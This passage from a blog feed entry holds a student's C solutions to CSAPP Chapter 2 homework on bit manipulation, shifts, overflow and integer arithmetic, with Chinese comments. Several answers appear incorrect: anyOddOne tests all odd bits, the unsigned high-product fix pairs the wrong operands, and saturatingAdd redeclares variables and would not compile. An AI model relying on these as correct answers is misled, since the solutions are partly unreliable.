class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = ~<span class="number">0</span> - ((<span class="number">1L</span>L&lt;&lt;(i+<span class="number">1</span>&lt;&lt;<span class="number">3</span>))-(<span class="number">1</span>&lt;&lt;(i&lt;&lt;<span class="number">3</span>)));</span><br><span class="line"><span class="keyword">return</span> x&amp;t|((<span class="keyword">unsigned</span>)b&lt;&lt;(i&lt;&lt;<span class="number">3</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-61"><a href="#2-61" class="headerlink" title="2.61"></a>2.61</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">A2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(x^~<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">B2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">C2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((x&amp;<span class="number">0xFF</span>)^<span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">D2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((<span class="keyword">unsigned</span>)x&gt;&gt;((<span class="keyword">sizeof</span>(<span class="keyword">int</span>)<span class="number">-1</span>)&lt;&lt;<span class="number">3</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-62"><a href="#2-62" class="headerlink" title="2.62"></a>2.62</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isRightShiftAreArithmetic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">-1</span>&gt;&gt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> x==<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-63"><a href="#2-63" class="headerlink" title="2.63"></a>2.63</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">srl</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> xsra = (<span class="keyword">int</span>)x&gt;&gt;k;</span><br><span class="line"><span class="keyword">return</span> xsra&amp;(<span class="number">1</span>&lt;&lt;(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)-k)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sra</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> xsrl = (<span class="keyword">unsigned</span>)x&gt;&gt;k;</span><br><span class="line"><span class="keyword">int</span> t = ~<span class="number">0</span>-(<span class="number">1</span>&lt;&lt;k)+<span class="number">1</span> &amp; x&gt;&gt;((<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> t|xsrl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-64"><a href="#2-64" class="headerlink" title="2.64"></a>2.64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anyOddOne</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (x&amp;<span class="number">0xaaaaaaaa</span>)==<span class="number">0xaaaaaaaa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-65"><a href="#2-65" class="headerlink" title="2.65"></a>2.65</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">oddOnesV1</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//思路，用xor消掉成对的1，不成对的记录下来</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">16</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">8</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">oddOnesV2</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//思路与上一个函数类似</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">1</span>;<span class="comment">//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">2</span>;<span class="comment">//只考虑mod4==0的位置</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">4</span>;<span class="comment">//只考虑mod8==0的位置</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">8</span>;<span class="comment">//只考虑mod16==0的位置</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">16</span>;<span class="comment">//只考虑mod32==0的位置</span></span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-66"><a href="#2-66" class="headerlink" title="2.66"></a>2.66</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leftMostOne</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line"><span class="keyword">return</span> x-(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-67"><a href="#2-67" class="headerlink" title="2.67"></a>2.67</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">intSizeIs32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> INT_MAX==<span class="number">0x80000000</span><span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-68"><a href="#2-68" class="headerlink" title="2.68"></a>2.68</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowerOneMark</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = -!(n-(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>));<span class="comment">//方法1</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>&amp;~t | t;</span><br><span class="line"><span class="comment">//return ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1;//方法2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-69"><a href="#2-69" class="headerlink" title="2.69"></a>2.69</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">rotateLeft</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞</span></span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;((<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span>)&lt;&lt;<span class="number">3</span>)-n<span class="number">-1</span>)&gt;&gt;<span class="number">1</span> | x&lt;&lt;n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-70"><a href="#2-70" class="headerlink" title="2.70"></a>2.70</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;n<span class="number">-1</span>==<span class="number">0</span> | x&gt;&gt;n<span class="number">-1</span>==<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-71"><a href="#2-71" class="headerlink" title="2.71"></a>2.71</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">pack_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xbyte</span><span class="params">(<span class="keyword">pack_t</span> word, <span class="keyword">int</span> bytenum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)word&lt;&lt;(<span class="number">3</span>-bytenum&lt;&lt;<span class="number">3</span>)&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-73"><a href="#2-73" class="headerlink" title="2.73"></a>2.73</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">saturatingAdd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//方法一</span></span><br><span class="line"><span class="keyword">int</span> t = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> p = ((<span class="keyword">unsigned</span>)x&gt;&gt;t)+((<span class="keyword">unsigned</span>)y&gt;&gt;t)+((<span class="keyword">unsigned</span>)x+y&gt;&gt;t);</span><br><span class="line">t = ((<span class="keyword">unsigned</span>)x&gt;&gt;t)+((<span class="keyword">unsigned</span>)y&gt;&gt;t);</span><br><span class="line"><span class="keyword">return</span> -(p==<span class="number">2</span>&amp;&amp;t!=<span class="number">1</span>)&amp;INT_MIN | -(p==<span class="number">1</span>&amp;&amp;t!=<span class="number">1</span>)&amp;INT_MAX | -(p==<span class="number">0</span>||t==<span class="number">1</span>)&amp;x+y | -(p==<span class="number">3</span>||t==<span class="number">1</span>)&amp;x+y;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line"><span class="keyword">int</span> t = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> p = ((<span class="keyword">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class="number">2</span>)|((<span class="keyword">unsigned</span>)y&gt;&gt;t&lt;&lt;<span class="number">1</span>)|((<span class="keyword">unsigned</span>)x+y&gt;&gt;t);</span><br><span class="line"><span class="keyword">return</span> -(p==<span class="number">6</span>)&amp;INT_MIN | -(p==<span class="number">1</span>)&amp;INT_MAX | -(p!=<span class="number">1</span>&amp;&amp;p!=<span class="number">6</span>)&amp;x+y;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）</span></span><br><span class="line"><span class="keyword">int</span> w=<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> sum = x+y;</span><br><span class="line"><span class="keyword">int</span> mask = <span class="number">1</span>&lt;&lt;(w<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">int</span> x_lmb = x&amp;mask;</span><br><span class="line"><span class="keyword">int</span> y_lmb = y&amp;mask;</span><br><span class="line"><span class="keyword">int</span> sum_lmb = sum&amp;mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb);</span><br><span class="line"><span class="keyword">int</span> pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb;</span><br><span class="line"></span><br><span class="line">(pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); <span class="comment">//这一条不错</span></span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-74"><a href="#2-74" class="headerlink" title="2.74"></a>2.74</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tsubOk</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> p = (<span class="keyword">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class="number">2</span> | (<span class="keyword">unsigned</span>)-y&gt;&gt;t&lt;&lt;<span class="number">1</span> | (<span class="keyword">unsigned</span>)x-y&gt;&gt;t;</span><br><span class="line">t = y==INT_MIN;</span><br><span class="line"><span class="keyword">return</span> p!=<span class="number">6</span> &amp;&amp; p!=<span class="number">1</span> &amp;&amp; !t || t &amp;&amp; p==<span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-75"><a href="#2-75" class="headerlink" title="2.75"></a>2.75</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">unsignedHightProd</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">unsigned</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> t = signed_high_prod(x, y);</span><br><span class="line"><span class="keyword">int</span> l = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-76"><a href="#2-76" class="headerlink" title="2.76"></a>2.76</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">Calloc</span><span class="params">(<span class="keyword">size_t</span> nmemb, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> t = nmemb*size;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">if</span>(!size || t/size==nmemb)&#123;</span><br><span class="line">p = <span class="built_in">malloc</span>(t);</span><br><span class="line"><span class="keyword">if</span>(!p)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(p, <span class="number">0</span>, t);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-77"><a href="#2-77" class="headerlink" title="2.77"></a>2.77</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f2_77</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> k1 = (x&lt;&lt;<span class="number">4</span>)+x;</span><br><span class="line"><span class="keyword">int</span> k2 = -(x&lt;&lt;<span class="number">3</span>)+x;</span><br><span class="line"><span class="keyword">int</span> k3 = (x&lt;&lt;<span class="number">6</span>)-(x&lt;&lt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> k4 = -(x&lt;&lt;<span class="number">7</span>)+(x&lt;&lt;<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> (k1==x*<span class="number">17</span>)&lt;&lt;<span class="number">3</span> | (k2==x*<span class="number">-7</span>)&lt;&lt;<span class="number">2</span> | (k3==x*<span class="number">60</span>)&lt;&lt;<span class="number">1</span> | k4==x*<span class="number">-112</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-78"><a href="#2-78" class="headerlink" title="2.78"></a>2.78</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dividePower2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l = <span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line">l = -(x&gt;&gt;l<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> (l&lt;&lt;k)-l+x &gt;&gt; k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-79"><a href="#2-79" class="headerlink" title="2.79"></a>2.79</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul3div4</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x = (x&lt;&lt;<span class="number">2</span>) - x;</span><br><span class="line"><span class="keyword">int</span> l = <span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> t = -(x&gt;&gt;l<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> (t&lt;&lt;<span class="number">2</span>)-t+x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-80"><a href="#2-80" class="headerlink" title="2.80"></a>2.80</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">threefourths</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = x&amp;<span class="number">0x3</span>;</span><br><span class="line"><span class="keyword">int</span> t2 = -(x&gt;&gt;(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">int</span> p = (x&gt;&gt;<span class="number">2</span>);</span><br><span class="line">p = (p&lt;&lt;<span class="number">1</span>)+p;</span><br><span class="line">t = (t&lt;&lt;<span class="number">1</span>)+t;</span><br><span class="line">p += (t&gt;&gt;<span class="number">2</span>) + (t2&amp;&amp;t);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-81"><a href="#2-81" class="headerlink" title="2.81"></a>2.81</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hw281A</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>-(<span class="number">1</span>&lt;&lt;k-!!k&lt;&lt;!!k);<span class="comment">//k may equal to 0 or 32;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hw281B</span><span class="params">(<span class="keyword">int</span> j, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = k+j;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>-(<span class="number">1</span>&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (<span class="number">0</span>-(<span class="number">1</span>&lt;&lt;t-!!t&lt;&lt;!!t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-82"><a href="#2-82" class="headerlink" title="2.82"></a>2.82</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A: NO; x== 0x10000000, B==rand();</span></span><br><span class="line"><span class="comment"> * B: Yes; </span></span><br><span class="line"><span class="comment"> * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。</span></span><br><span class="line"><span class="comment"> * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加</span></span><br><span class="line"><span class="comment"> * D: Yes;</span></span><br><span class="line"><span class="comment"> * E: Yes;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="2-83"><a href="#2-83" class="headerlink" title="2.83"></a>2.83</h2><p>$\sum_{i=1}^{\infty}Y<em>2^{-k</em>i}$</p><h2 id="2-84"><a href="#2-84" class="headerlink" title="2.84"></a>2.84</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ((sx&lt;sy) &amp;&amp; ux!=<span class="number">0</span> &amp;&amp; uy!=<span class="number">0x80000000</span>) | (sx==sy) &amp; !!(ux-uy);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      My solution to Ch2&#39;s Hw
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Homework" scheme="https://h-zex.github.io/tags/CSAPP-Homework/"/>
    
  </entry>
  
</feed>
